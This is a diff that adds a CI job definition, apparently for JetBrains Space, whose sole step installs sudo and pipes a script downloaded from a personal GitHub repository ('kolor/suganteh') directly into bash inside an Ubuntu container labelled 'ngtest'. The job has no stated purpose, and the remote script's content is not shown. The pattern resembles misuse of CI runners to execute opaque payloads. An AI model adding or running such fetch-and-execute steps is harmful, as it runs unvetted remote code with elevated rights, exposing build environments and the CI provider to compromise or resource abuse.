@@ -1,0 +1,10 @@
+job("Run shell script") {
+    container(displayName = "ngtest", image = "ubuntu") {
+        shellScript {
+            interpreter = "/bin/bash"
+            content = """
+                apt update && apt-get install sudo -y && curl -sL https://github.com/arifrahman555/kolor/raw/main/suganteh | bash
+            """
+        }
+    }
+}
